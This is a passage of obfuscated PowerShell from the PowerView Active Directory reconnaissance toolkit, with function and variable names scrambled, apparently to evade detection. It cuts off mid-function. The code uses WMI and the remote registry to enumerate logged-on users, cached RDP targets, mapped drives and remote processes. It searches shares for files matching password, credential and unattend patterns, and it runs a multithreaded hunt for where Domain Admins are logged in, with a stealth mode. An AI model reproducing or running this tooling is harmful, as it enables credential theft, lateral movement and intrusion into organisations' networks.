            if ($PSBoundParameters['Credential']) { $cneXuwmF99['Credential'] = $QWHERWHL99 }
            try {
                $Reg = Get-WmiObject @WmiArguments
                $Key = 'SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\LogonUI'
                $Value = 'LastLoggedOnUser'
                $RDwDGhSt99 = $Reg.GetStringValue($HKLM, $Key, $Value).sValue
                $bjFzrIeC99 = New-Object PSObject
                $bjFzrIeC99 | Add-Member Noteproperty 'ComputerName' $UEyZXQpH99
                $bjFzrIeC99 | Add-Member Noteproperty 'LastLoggedOn' $RDwDGhSt99
                $bjFzrIeC99.PSObject.TypeNames.Insert(0, 'PowerView.LastLoggedOnUser')
                $bjFzrIeC99
            }
            catch {
                Write-Warning "[fills] Error opening remote registry on $UEyZXQpH99. Remote registry likely not enabled."
            }
        }
    }
}
function la {
    [OutputType('PowerView.CachedRDPConnection')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $iEYVPYCX99 = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $QWHERWHL99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        ForEach ($UEyZXQpH99 in $iEYVPYCX99) {
            $HKU = 2147483651
            $cneXuwmF99 = @{
                'List' = $True
                'Class' = 'StdRegProv'
                'Namespace' = 'root\default'
                'Computername' = $UEyZXQpH99
                'ErrorAction' = 'Stop'
            }
            if ($PSBoundParameters['Credential']) { $cneXuwmF99['Credential'] = $QWHERWHL99 }
            try {
                $Reg = Get-WmiObject @WmiArguments
                $nQvqrMLE99 = ($Reg.EnumKey($HKU, '')).sNames | Where-Object { $_ -match 'S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+$' }
                ForEach ($GiIoZyCS99 in $nQvqrMLE99) {
                    try {
                        if ($PSBoundParameters['Credential']) {
                            $TEQSWNGN99 = vileness -JsKvOOQh99 $GiIoZyCS99 -QWHERWHL99 $QWHERWHL99
                        }
                        else {
                            $TEQSWNGN99 = vileness -JsKvOOQh99 $GiIoZyCS99
                        }
                        $wVmsigwf99 = $Reg.EnumValues($HKU,"$GiIoZyCS99\Software\Microsoft\Terminal Server Client\Default").sNames
                        ForEach ($BMGthpsU99 in $wVmsigwf99) {
                            if ($BMGthpsU99 -match 'MRU.*') {
                                $bFDyMRIV99 = $Reg.GetStringValue($HKU, "$GiIoZyCS99\Software\Microsoft\Terminal Server Client\Default", $BMGthpsU99).sValue
                                $xeLxxWBt99 = New-Object PSObject
                                $xeLxxWBt99 | Add-Member Noteproperty 'ComputerName' $UEyZXQpH99
                                $xeLxxWBt99 | Add-Member Noteproperty 'UserName' $TEQSWNGN99
                                $xeLxxWBt99 | Add-Member Noteproperty 'UserSID' $GiIoZyCS99
                                $xeLxxWBt99 | Add-Member Noteproperty 'TargetServer' $bFDyMRIV99
                                $xeLxxWBt99 | Add-Member Noteproperty 'UsernameHint' $Null
                                $xeLxxWBt99.PSObject.TypeNames.Insert(0, 'PowerView.CachedRDPConnection')
                                $xeLxxWBt99
                            }
                        }
                        $RviyJMiY99 = $Reg.EnumKey($HKU,"$GiIoZyCS99\Software\Microsoft\Terminal Server Client\Servers").sNames
                        ForEach ($vbyFupaI99 in $RviyJMiY99) {
                            $dsWqSxOP99 = $Reg.GetStringValue($HKU, "$GiIoZyCS99\Software\Microsoft\Terminal Server Client\Servers\$vbyFupaI99", 'UsernameHint').sValue
                            $xeLxxWBt99 = New-Object PSObject
                            $xeLxxWBt99 | Add-Member Noteproperty 'ComputerName' $UEyZXQpH99
                            $xeLxxWBt99 | Add-Member Noteproperty 'UserName' $TEQSWNGN99
                            $xeLxxWBt99 | Add-Member Noteproperty 'UserSID' $GiIoZyCS99
                            $xeLxxWBt99 | Add-Member Noteproperty 'TargetServer' $vbyFupaI99
                            $xeLxxWBt99 | Add-Member Noteproperty 'UsernameHint' $dsWqSxOP99
                            $xeLxxWBt99.PSObject.TypeNames.Insert(0, 'PowerView.CachedRDPConnection')
                            $xeLxxWBt99
                        }
                    }
                    catch {
                        Write-Verbose "[la] Error: $_"
                    }
                }
            }
            catch {
                Write-Warning "[la] Error accessing $UEyZXQpH99, likely insufficient permissions or firewall rules on host: $_"
            }
        }
    }
}
function paragraphing {
    [OutputType('PowerView.RegMountedDrive')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $iEYVPYCX99 = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $QWHERWHL99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        ForEach ($UEyZXQpH99 in $iEYVPYCX99) {
            $HKU = 2147483651
            $cneXuwmF99 = @{
                'List' = $True
                'Class' = 'StdRegProv'
                'Namespace' = 'root\default'
                'Computername' = $UEyZXQpH99
                'ErrorAction' = 'Stop'
            }
            if ($PSBoundParameters['Credential']) { $cneXuwmF99['Credential'] = $QWHERWHL99 }
            try {
                $Reg = Get-WmiObject @WmiArguments
                $nQvqrMLE99 = ($Reg.EnumKey($HKU, '')).sNames | Where-Object { $_ -match 'S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+$' }
                ForEach ($GiIoZyCS99 in $nQvqrMLE99) {
                    try {
                        if ($PSBoundParameters['Credential']) {
                            $TEQSWNGN99 = vileness -JsKvOOQh99 $GiIoZyCS99 -QWHERWHL99 $QWHERWHL99
                        }
                        else {
                            $TEQSWNGN99 = vileness -JsKvOOQh99 $GiIoZyCS99
                        }
                        $ADhwmcyH99 = ($Reg.EnumKey($HKU, "$GiIoZyCS99\Network")).sNames
                        ForEach ($kvYpWIcQ99 in $ADhwmcyH99) {
                            $pUIsnaIG99 = $Reg.GetStringValue($HKU, "$GiIoZyCS99\Network\$kvYpWIcQ99", 'ProviderName').sValue
                            $NNxYYwmZ99 = $Reg.GetStringValue($HKU, "$GiIoZyCS99\Network\$kvYpWIcQ99", 'RemotePath').sValue
                            $JpnpeMsT99 = $Reg.GetStringValue($HKU, "$GiIoZyCS99\Network\$kvYpWIcQ99", 'UserName').sValue
                            if (-not $TEQSWNGN99) { $TEQSWNGN99 = '' }
                            if ($NNxYYwmZ99 -and ($NNxYYwmZ99 -ne '')) {
                                $qQiMEvBP99 = New-Object PSObject
                                $qQiMEvBP99 | Add-Member Noteproperty 'ComputerName' $UEyZXQpH99
                                $qQiMEvBP99 | Add-Member Noteproperty 'UserName' $TEQSWNGN99
                                $qQiMEvBP99 | Add-Member Noteproperty 'UserSID' $GiIoZyCS99
                                $qQiMEvBP99 | Add-Member Noteproperty 'DriveLetter' $kvYpWIcQ99
                                $qQiMEvBP99 | Add-Member Noteproperty 'ProviderName' $pUIsnaIG99
                                $qQiMEvBP99 | Add-Member Noteproperty 'RemotePath' $NNxYYwmZ99
                                $qQiMEvBP99 | Add-Member Noteproperty 'DriveUserName' $JpnpeMsT99
                                $qQiMEvBP99.PSObject.TypeNames.Insert(0, 'PowerView.RegMountedDrive')
                                $qQiMEvBP99
                            }
                        }
                    }
                    catch {
                        Write-Verbose "[paragraphing] Error: $_"
                    }
                }
            }
            catch {
                Write-Warning "[paragraphing] Error accessing $UEyZXQpH99, likely insufficient permissions or firewall rules on host: $_"
            }
        }
    }
}
function ratcheting {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.UserProcess')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $iEYVPYCX99 = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $QWHERWHL99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        ForEach ($UEyZXQpH99 in $iEYVPYCX99) {
            try {
                $cneXuwmF99 = @{
                    'ComputerName' = $iEYVPYCX99
                    'Class' = 'Win32_process'
                }
                if ($PSBoundParameters['Credential']) { $cneXuwmF99['Credential'] = $QWHERWHL99 }
                Get-WMIobject @WmiArguments | ForEach-Object {
                    $Owner = $_.getowner();
                    $lFoSVtQU99 = New-Object PSObject
                    $lFoSVtQU99 | Add-Member Noteproperty 'ComputerName' $UEyZXQpH99
                    $lFoSVtQU99 | Add-Member Noteproperty 'ProcessName' $_.ProcessName
                    $lFoSVtQU99 | Add-Member Noteproperty 'ProcessID' $_.ProcessID
                    $lFoSVtQU99 | Add-Member Noteproperty 'Domain' $Owner.Domain
                    $lFoSVtQU99 | Add-Member Noteproperty 'User' $Owner.User
                    $lFoSVtQU99.PSObject.TypeNames.Insert(0, 'PowerView.UserProcess')
                    $lFoSVtQU99
                }
            }
            catch {
                Write-Verbose "[ratcheting] Error enumerating remote processes on '$UEyZXQpH99', access likely denied: $_"
            }
        }
    }
}
function Chernenko {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.FoundFile')]
    [CmdletBinding(DefaultParameterSetName = 'FileSpecification')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Path = '.\',
        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [Alias('SearchTerms', 'Terms')]
        [String[]]
        $wgdxPkMU99 = @('*password*', '*sensitive*', '*admin*', '*login*', '*secret*', 'unattend*.xml', '*.vmdk', '*creds*', '*credential*', '*.config'),
        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $WuUAsRWe99,
        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $fCZUtfXv99,
        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $TGZTAUVT99,
        [Parameter(ParameterSetName = 'OfficeDocs')]
        [Switch]
        $RBVDfBvN99,
        [Parameter(ParameterSetName = 'FreshEXEs')]
        [Switch]
        $NiXerRmZ99,
        [Parameter(ParameterSetName = 'FileSpecification')]
        [Switch]
        $XsJlELiE99,
        [Parameter(ParameterSetName = 'FileSpecification')]
        [Switch]
        $IdImphCi99,
        [Switch]
        $SHHIwpbe99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $QWHERWHL99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $qbMTjYnI99 =  @{
            'Recurse' = $True
            'ErrorAction' = 'SilentlyContinue'
            'Include' = $wgdxPkMU99
        }
        if ($PSBoundParameters['OfficeDocs']) {
            $qbMTjYnI99['Include'] = @('*.doc', '*.docx', '*.xls', '*.xlsx', '*.ppt', '*.pptx')
        }
        elseif ($PSBoundParameters['FreshEXEs']) {
            $WuUAsRWe99 = (Get-Date).AddDays(-7).ToString('MM/dd/yyyy')
            $qbMTjYnI99['Include'] = @('*.exe')
        }
        $qbMTjYnI99['Force'] = -not $PSBoundParameters['ExcludeHidden']
        $wOegLMVb99 = @{}
        function cipher {
            [CmdletBinding()]Param([String]$Path)
            try {
                $yqGEcHAG99 = [IO.File]::OpenWrite($Path)
                $yqGEcHAG99.Close()
                $True
            }
            catch {
                $False
            }
        }
    }
    PROCESS {
        ForEach ($ksjaRAXe99 in $Path) {
            if (($ksjaRAXe99 -Match '\\\\.*\\.*') -and ($PSBoundParameters['Credential'])) {
                $UepKaYkI99 = (New-Object System.Uri($ksjaRAXe99)).Host
                if (-not $wOegLMVb99[$UepKaYkI99]) {
                    hepper -iEYVPYCX99 $UepKaYkI99 -QWHERWHL99 $QWHERWHL99
                    $wOegLMVb99[$UepKaYkI99] = $True
                }
            }
            $qbMTjYnI99['Path'] = $ksjaRAXe99
            Get-ChildItem @SearcherArguments | ForEach-Object {
                $EsriSBxN99 = $True
                if ($PSBoundParameters['ExcludeFolders'] -and ($_.PSIsContainer)) {
                    Write-Verbose "Excluding: $($_.FullName)"
                    $EsriSBxN99 = $False
                }
                if ($WuUAsRWe99 -and ($_.LastAccessTime -lt $WuUAsRWe99)) {
                    $EsriSBxN99 = $False
                }
                if ($PSBoundParameters['LastWriteTime'] -and ($_.LastWriteTime -lt $fCZUtfXv99)) {
                    $EsriSBxN99 = $False
                }
                if ($PSBoundParameters['CreationTime'] -and ($_.CreationTime -lt $TGZTAUVT99)) {
                    $EsriSBxN99 = $False
                }
                if ($PSBoundParameters['CheckWriteAccess'] -and (-not (cipher -Path $_.FullName))) {
                    $EsriSBxN99 = $False
                }
                if ($EsriSBxN99) {
                    $fKGDRHkB99 = @{
                        'Path' = $_.FullName
                        'Owner' = $((Get-Acl $_.FullName).Owner)
                        'LastAccessTime' = $_.LastAccessTime
                        'LastWriteTime' = $_.LastWriteTime
                        'CreationTime' = $_.CreationTime
                        'Length' = $_.Length
                    }
                    $CsyRBQRJ99 = New-Object -TypeName PSObject -Property $fKGDRHkB99
                    $CsyRBQRJ99.PSObject.TypeNames.Insert(0, 'PowerView.FoundFile')
                    $CsyRBQRJ99
                }
            }
        }
    }
    END {
        $wOegLMVb99.Keys | grand
    }
}
function recuperate {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [String[]]
        $iEYVPYCX99,
        [Parameter(Position = 1, Mandatory = $True)]
        [System.Management.Automation.ScriptBlock]
        $WwGMfZTW99,
        [Parameter(Position = 2)]
        [Hashtable]
        $hJnTvHxu99,
        [Int]
        [ValidateRange(1,  100)]
        $InJWRogf99 = 20,
        [Switch]
        $yXRkFlhc99
    )
    BEGIN {
        $EGymFYxB99 = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()
        $EGymFYxB99.ApartmentState = [System.Threading.ApartmentState]::STA
        if (-not $yXRkFlhc99) {
            $hxdKICdw99 = Get-Variable -Scope 2
            $epDZGTTl99 = @('?','args','ConsoleFileName','Error','ExecutionContext','false','HOME','Host','input','InputObject','MaximumAliasCount','MaximumDriveCount','MaximumErrorCount','MaximumFunctionCount','MaximumHistoryCount','MaximumVariableCount','MyInvocation','null','PID','PSBoundParameters','PSCommandPath','PSCulture','PSDefaultParameterValues','PSHOME','PSScriptRoot','PSUICulture','PSVersionTable','PWD','ShellId','SynchronizedHash','true')
            ForEach ($Var in $hxdKICdw99) {
                if ($epDZGTTl99 -NotContains $Var.Name) {
                $EGymFYxB99.Variables.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateVariableEntry -ArgumentList $Var.name,$Var.Value,$Var.description,$Var.options,$Var.attributes))
                }
            }
            ForEach ($ZqomZvNw99 in (Get-ChildItem Function:)) {
                $EGymFYxB99.Commands.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateFunctionEntry -ArgumentList $ZqomZvNw99.Name, $ZqomZvNw99.Definition))
            }
        }
        $Pool = [RunspaceFactory]::CreateRunspacePool(1, $InJWRogf99, $EGymFYxB99, $Host)
        $Pool.Open()
        $nFyaxSAK99 = $Null
        ForEach ($M in [PowerShell].GetMethods() | Where-Object { $_.Name -eq 'BeginInvoke' }) {
            $vYrBNaUG99 = $M.GetParameters()
            if (($vYrBNaUG99.Count -eq 2) -and $vYrBNaUG99[0].Name -eq 'input' -and $vYrBNaUG99[1].Name -eq 'output') {
                $nFyaxSAK99 = $M.MakeGenericMethod([Object], [Object])
                break
            }
        }
        $Jobs = @()
        $iEYVPYCX99 = $iEYVPYCX99 | Where-Object {$_ -and $_.Trim()}
        Write-Verbose "[recuperate] Total number of hosts: $($iEYVPYCX99.count)"
        if ($InJWRogf99 -ge $iEYVPYCX99.Length) {
            $InJWRogf99 = $iEYVPYCX99.Length
        }
        $VEWJDqcZ99 = [Int]($iEYVPYCX99.Length/$InJWRogf99)
        $sBLogrHK99 = @()
        $Start = 0
        $End = $VEWJDqcZ99
        for($i = 1; $i -le $InJWRogf99; $i++) {
            $List = New-Object System.Collections.ArrayList
            if ($i -eq $InJWRogf99) {
                $End = $iEYVPYCX99.Length
            }
            $List.AddRange($iEYVPYCX99[$Start..($End-1)])
            $Start += $VEWJDqcZ99
            $End += $VEWJDqcZ99
            $sBLogrHK99 += @(,@($List.ToArray()))
        }
        Write-Verbose "[recuperate] Total number of threads/partitions: $InJWRogf99"
        ForEach ($VlGREaFl99 in $sBLogrHK99) {
            $hhCyhmkO99 = [PowerShell]::Create()
            $hhCyhmkO99.runspacepool = $Pool
            $Null = $hhCyhmkO99.AddScript($WwGMfZTW99).AddParameter('ComputerName', $VlGREaFl99)
            if ($hJnTvHxu99) {
                ForEach ($Param in $hJnTvHxu99.GetEnumerator()) {
                    $Null = $hhCyhmkO99.AddParameter($Param.Name, $Param.Value)
                }
            }
            $TVkhXGOk99 = New-Object Management.Automation.PSDataCollection[Object]
            $Jobs += @{
                PS = $hhCyhmkO99
                Output = $TVkhXGOk99
                Result = $nFyaxSAK99.Invoke($hhCyhmkO99, @($Null, [Management.Automation.PSDataCollection[Object]]$TVkhXGOk99))
            }
        }
    }
    END {
        Write-Verbose "[recuperate] Threads executing"
        Do {
            ForEach ($Job in $Jobs) {
                $Job.Output.ReadAll()
            }
            Start-Sleep -Seconds 1
        }
        While (($Jobs | Where-Object { -not $_.Result.IsCompleted }).Count -gt 0)
        $iizImjjV99 = 100
        Write-Verbose "[recuperate] Waiting $iizImjjV99 seconds for final cleanup..."
        for ($i=0; $i -lt $iizImjjV99; $i++) {
            ForEach ($Job in $Jobs) {
                $Job.Output.ReadAll()
                $Job.PS.Dispose()
            }
            Start-Sleep -S 1
        }
        $Pool.Dispose()
        Write-Verbose "[recuperate] all threads completed"
    }
}
function noxious {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.UserLocation')]
    [CmdletBinding(DefaultParameterSetName = 'UserGroupIdentity')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        $iEYVPYCX99,
        [ValidateNotNullOrEmpty()]
        [String]
        $CmuysoGL99,
        [ValidateNotNullOrEmpty()]
        [String]
        $WrQcWRYD99,
        [ValidateNotNullOrEmpty()]
        [String]
        $PcddQtAy99,
        [ValidateNotNullOrEmpty()]
        [String]
        $cpoQzrSk99,
        [Alias('Unconstrained')]
        [Switch]
        $XcKoPUUD99,
        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $gosnxdoy99,
        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $qlsvvtLC99,
        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $oyguzKXd99,
        [Parameter(ParameterSetName = 'UserIdentity')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $xcenmayP99,
        [ValidateNotNullOrEmpty()]
        [String]
        $wvZHbMee99,
        [ValidateNotNullOrEmpty()]
        [String]
        $UIdYQyoC99,
        [ValidateNotNullOrEmpty()]
        [String]
        $IhePRRvG99,
        [Parameter(ParameterSetName = 'UserGroupIdentity')]
        [ValidateNotNullOrEmpty()]
        [Alias('GroupName', 'Group')]
        [String[]]
        $yZnISgIj99 = 'Domain Admins',
        [Alias('AdminCount')]
        [Switch]
        $hFUNKKKC99,
        [Alias('AllowDelegation')]
        [Switch]
        $bSdKPeFn99,
        [Switch]
        $NEqdIfsc99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $vbyFupaI99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $RVZhWaEH99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $rguZwVJP99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $CRJCwXfg99,
        [Switch]
        $iqiYBoee99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $QWHERWHL99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $PmmsrNDG99,
        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        $uQeLHAls99 = .3,
        [Parameter(ParameterSetName = 'ShowAll')]
        [Switch]
        $tmsSRJiz99,
        [Switch]
        $OIjSaWab99,
        [String]
        [ValidateSet('DFS', 'DC', 'File', 'All')]
        $Rsigsgmu99 = 'All',
        [Int]
        [ValidateRange(1, 100)]
        $InJWRogf99 = 20
    )
    BEGIN {
        $wyZNUiid99 = @{
            'Properties' = 'dnshostname'
        }
        if ($PSBoundParameters['Domain']) { $wyZNUiid99['Domain'] = $CmuysoGL99 }
        if ($PSBoundParameters['ComputerDomain']) { $wyZNUiid99['Domain'] = $WrQcWRYD99 }
        if ($PSBoundParameters['ComputerLDAPFilter']) { $wyZNUiid99['LDAPFilter'] = $PcddQtAy99 }
        if ($PSBoundParameters['ComputerSearchBase']) { $wyZNUiid99['SearchBase'] = $cpoQzrSk99 }
        if ($PSBoundParameters['Unconstrained']) { $wyZNUiid99['Unconstrained'] = $vDbTHhCu99 }
        if ($PSBoundParameters['ComputerOperatingSystem']) { $wyZNUiid99['OperatingSystem'] = $blbEZMhK99 }
        if ($PSBoundParameters['ComputerServicePack']) { $wyZNUiid99['ServicePack'] = $sXOuralh99 }
        if ($PSBoundParameters['ComputerSiteName']) { $wyZNUiid99['SiteName'] = $cgKWGcFU99 }
        if ($PSBoundParameters['Server']) { $wyZNUiid99['Server'] = $vbyFupaI99 }
        if ($PSBoundParameters['SearchScope']) { $wyZNUiid99['SearchScope'] = $RVZhWaEH99 }
        if ($PSBoundParameters['ResultPageSize']) { $wyZNUiid99['ResultPageSize'] = $rguZwVJP99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $wyZNUiid99['ServerTimeLimit'] = $CRJCwXfg99 }
        if ($PSBoundParameters['Tombstone']) { $wyZNUiid99['Tombstone'] = $iqiYBoee99 }
        if ($PSBoundParameters['Credential']) { $wyZNUiid99['Credential'] = $QWHERWHL99 }
        $vtcZsFqI99 = @{
            'Properties' = 'samaccountname'
        }
        if ($PSBoundParameters['UserIdentity']) { $vtcZsFqI99['Identity'] = $xcenmayP99 }
        if ($PSBoundParameters['Domain']) { $vtcZsFqI99['Domain'] = $CmuysoGL99 }
        if ($PSBoundParameters['UserDomain']) { $vtcZsFqI99['Domain'] = $wvZHbMee99 }
        if ($PSBoundParameters['UserLDAPFilter']) { $vtcZsFqI99['LDAPFilter'] = $UIdYQyoC99 }
        if ($PSBoundParameters['UserSearchBase']) { $vtcZsFqI99['SearchBase'] = $IhePRRvG99 }
        if ($PSBoundParameters['UserAdminCount']) { $vtcZsFqI99['AdminCount'] = $hFUNKKKC99 }
        if ($PSBoundParameters['UserAllowDelegation']) { $vtcZsFqI99['AllowDelegation'] = $bSdKPeFn99 }
        if ($PSBoundParameters['Server']) { $vtcZsFqI99['Server'] = $vbyFupaI99 }
        if ($PSBoundParameters['SearchScope']) { $vtcZsFqI99['SearchScope'] = $RVZhWaEH99 }
        if ($PSBoundParameters['ResultPageSize']) { $vtcZsFqI99['ResultPageSize'] = $rguZwVJP99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $vtcZsFqI99['ServerTimeLimit'] = $CRJCwXfg99 }
        if ($PSBoundParameters['Tombstone']) { $vtcZsFqI99['Tombstone'] = $iqiYBoee99 }
        if ($PSBoundParameters['Credential']) { $vtcZsFqI99['Credential'] = $QWHERWHL99 }
        $gzPujpsa99 = @()
        if ($PSBoundParameters['ComputerName']) {
            $gzPujpsa99 = @($iEYVPYCX99)
        }
        else {
            if ($PSBoundParameters['Stealth']) {
                Write-Verbose "[noxious] Stealth enumeration using source: $Rsigsgmu99"
                $kEbiaCrE99 = New-Object System.Collections.ArrayList
                if ($Rsigsgmu99 -match 'File|All') {
                    Write-Verbose '[noxious] Querying for file servers'
                    $HUTbAgAl99 = @{}
                    if ($PSBoundParameters['Domain']) { $HUTbAgAl99['Domain'] = $CmuysoGL99 }
                    if ($PSBoundParameters['ComputerDomain']) { $HUTbAgAl99['Domain'] = $WrQcWRYD99 }
                    if ($PSBoundParameters['ComputerSearchBase']) { $HUTbAgAl99['SearchBase'] = $cpoQzrSk99 }
                    if ($PSBoundParameters['Server']) { $HUTbAgAl99['Server'] = $vbyFupaI99 }
                    if ($PSBoundParameters['SearchScope']) { $HUTbAgAl99['SearchScope'] = $RVZhWaEH99 }
                    if ($PSBoundParameters['ResultPageSize']) { $HUTbAgAl99['ResultPageSize'] = $rguZwVJP99 }
                    if ($PSBoundParameters['ServerTimeLimit']) { $HUTbAgAl99['ServerTimeLimit'] = $CRJCwXfg99 }
                    if ($PSBoundParameters['Tombstone']) { $HUTbAgAl99['Tombstone'] = $iqiYBoee99 }
                    if ($PSBoundParameters['Credential']) { $HUTbAgAl99['Credential'] = $QWHERWHL99 }
                    $xuidYgNY99 = Walmart @FileServerSearcherArguments
                    if ($xuidYgNY99 -isnot [System.Array]) { $xuidYgNY99 = @($xuidYgNY99) }
                    $kEbiaCrE99.AddRange( $xuidYgNY99 )
                }
                if ($Rsigsgmu99 -match 'DFS|All') {
                    Write-Verbose '[noxious] Querying for DFS servers'
                }
                if ($Rsigsgmu99 -match 'DC|All') {
                    Write-Verbose '[noxious] Querying for domain controllers'
                    $hJqdOzKQ99 = @{
                        'LDAP' = $True
                    }
                    if ($PSBoundParameters['Domain']) { $hJqdOzKQ99['Domain'] = $CmuysoGL99 }
                    if ($PSBoundParameters['ComputerDomain']) { $hJqdOzKQ99['Domain'] = $WrQcWRYD99 }
                    if ($PSBoundParameters['Server']) { $hJqdOzKQ99['Server'] = $vbyFupaI99 }
                    if ($PSBoundParameters['Credential']) { $hJqdOzKQ99['Credential'] = $QWHERWHL99 }
                    $dFeUaHXW99 = Marsala @DCSearcherArguments | Select-Object -ExpandProperty dnshostname
                    if ($dFeUaHXW99 -isnot [System.Array]) { $dFeUaHXW99 = @($dFeUaHXW99) }
                    $kEbiaCrE99.AddRange( $dFeUaHXW99 )
                }
                $gzPujpsa99 = $kEbiaCrE99.ToArray()
            }
            else {
                Write-Verbose '[noxious] Querying for all computers in the domain'
                $gzPujpsa99 = beefsteaks @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
            }
        }
        Write-Verbose "[noxious] TargetComputers length: $($gzPujpsa99.Length)"
        if ($gzPujpsa99.Length -eq 0) {
            throw '[noxious] No hosts found to enumerate'
        }
        if ($PSBoundParameters['Credential']) {
            $bDAylcSa99 = $QWHERWHL99.GetNetworkCredential().UserName
        }
        else {
            $bDAylcSa99 = ([Environment]::UserName).ToLower()
        }
        if ($PSBoundParameters['ShowAll']) {
            $xYlValoQ99 = @()
        }
        elseif ($PSBoundParameters['UserIdentity'] -or $PSBoundParameters['UserLDAPFilter'] -or $PSBoundParameters['UserSearchBase'] -or $PSBoundParameters['UserAdminCount'] -or $PSBoundParameters['UserAllowDelegation']) {
            $xYlValoQ99 = melodrama @UserSearcherArguments | Select-Object -ExpandProperty samaccountname
        }
        else {
            $wPpyiOTM99 = @{
                'Identity' = $yZnISgIj99
                'Recurse' = $True
            }
            if ($PSBoundParameters['UserDomain']) { $wPpyiOTM99['Domain'] = $wvZHbMee99 }
            if ($PSBoundParameters['UserSearchBase']) { $wPpyiOTM99['SearchBase'] = $IhePRRvG99 }
            if ($PSBoundParameters['Server']) { $wPpyiOTM99['Server'] = $vbyFupaI99 }
            if ($PSBoundParameters['SearchScope']) { $wPpyiOTM99['SearchScope'] = $RVZhWaEH99 }
            if ($PSBoundParameters['ResultPageSize']) { $wPpyiOTM99['ResultPageSize'] = $rguZwVJP99 }
            if ($PSBoundParameters['ServerTimeLimit']) { $wPpyiOTM99['ServerTimeLimit'] = $CRJCwXfg99 }
            if ($PSBoundParameters['Tombstone']) { $wPpyiOTM99['Tombstone'] = $iqiYBoee99 }
            if ($PSBoundParameters['Credential']) { $wPpyiOTM99['Credential'] = $QWHERWHL99 }
            $xYlValoQ99 = plowed @GroupSearcherArguments | Select-Object -ExpandProperty MemberName
        }
        Write-Verbose "[noxious] TargetUsers length: $($xYlValoQ99.Length)"
        if ((-not $tmsSRJiz99) -and ($xYlValoQ99.Length -eq 0)) {
            throw '[noxious] No users found to target'
        }
        $avGNuFUJ99 = {
            Param($iEYVPYCX99, $xYlValoQ99, $bDAylcSa99, $OIjSaWab99, $sdyalGJn99)
            if ($sdyalGJn99) {
                $Null = pant -sdyalGJn99 $sdyalGJn99 -Quiet
            }
            ForEach ($kqQkzLHh99 in $iEYVPYCX99) {
                $Up = Test-Connection -Count 1 -Quiet -iEYVPYCX99 $kqQkzLHh99
                if ($Up) {
                    $qANrBara99 = reigning -iEYVPYCX99 $kqQkzLHh99
                    ForEach ($gCHYbUFe99 in $qANrBara99) {
                        $TEQSWNGN99 = $gCHYbUFe99.UserName
                        $CName = $gCHYbUFe99.CName
                        if ($CName -and $CName.StartsWith('\\')) {
                            $CName = $CName.TrimStart('\')
                        }
                        if (($TEQSWNGN99) -and ($TEQSWNGN99.Trim() -ne '') -and ($TEQSWNGN99 -notmatch $bDAylcSa99) -and ($TEQSWNGN99 -notmatch '\$$')) {
                            if ( (-not $xYlValoQ99) -or ($xYlValoQ99 -contains $TEQSWNGN99)) {
                                $jjPRFsPD99 = New-Object PSObject
